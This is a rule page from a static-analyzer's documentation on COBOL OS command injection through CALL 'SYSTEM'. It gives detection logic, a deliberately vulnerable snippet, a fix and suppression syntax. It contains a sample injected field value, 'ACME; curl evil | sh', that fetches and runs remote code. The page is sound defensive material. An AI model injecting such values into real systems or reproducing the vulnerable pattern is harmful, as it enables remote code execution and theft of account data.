# ALZ-COB-002: OS command execution via CALL "SYSTEM"

| | |
|---|---|
| **Severity** | Critical (critical when the command is a data item, medium for a literal command) |
| **CWE** | [CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')](https://cwe.mitre.org/data/definitions/78.html) |
| **Language** | COBOL |
| **Precision** | High |
| **SARIF name** | `OsCommandExecution` |

The program passes a command string to the operating-system shell.

## What Watchtower detects

`CALL "SYSTEM"`, `CALL "C$SYSTEM"` and `CALL "CBL_EXEC_RUN_UNIT"` (any case). The finding is **critical** when the first `USING` argument is a data item or an expression and **medium** when it is a literal. A dynamic `CALL` through an item whose `VALUE` is one of these names is also reported.

## Why it matters in legacy systems

Shelling out is a common shortcut in modernised batch code: notifying operations, compressing a report, printing cheques. The string is handed to `/bin/sh` (or `cmd.exe`), so a beneficiary name such as `ACME; curl evil | sh` in an input record executes with the batch user's privileges, which on a bank's batch server usually means access to every account file the job reads.

## Vulnerable example

```cobol
           STRING "notify-ops.sh " DELIMITED BY SIZE
                  IN-BENEF-NAME DELIMITED BY SIZE
                  INTO WS-SHELL-CMD
           END-STRING
           CALL "SYSTEM" USING WS-SHELL-CMD
```

## Fixed example

```cobol
      *    No shell: write an event record that the scheduler consumes.
           MOVE "XFERDONE" TO OPS-EVENT
           MOVE IN-FROM-ACCT TO OPS-FROM-ACCT
           WRITE OPS-QUEUE-REC
           IF NOT OPS-OK
               MOVE 16 TO WS-RETURN-CODE
           END-IF
```

## How to fix

Do not shell out: call a COBOL or C routine for the task. If an external command is unavoidable, use a fixed literal without user data, or validate every argument against a strict character allowlist.

## Suppressing a finding

If an occurrence is safe, document why in a comment on the same line or on the line just above:

```cobol
      *> watchtower-ignore ALZ-COB-002 -- <why this occurrence is safe>
```

A suppression without a `-- reason` is ignored and the finding stays. Suppressed findings are kept in the JSON
output and appear in SARIF with `suppressions: [{ kind: "inSource", justification }]`.

## References

- [CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')](https://cwe.mitre.org/data/definitions/78.html)
- [OWASP: OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [GnuCOBOL Programmer's Guide](https://gnucobol.sourceforge.io/doc/gnucobol.html)
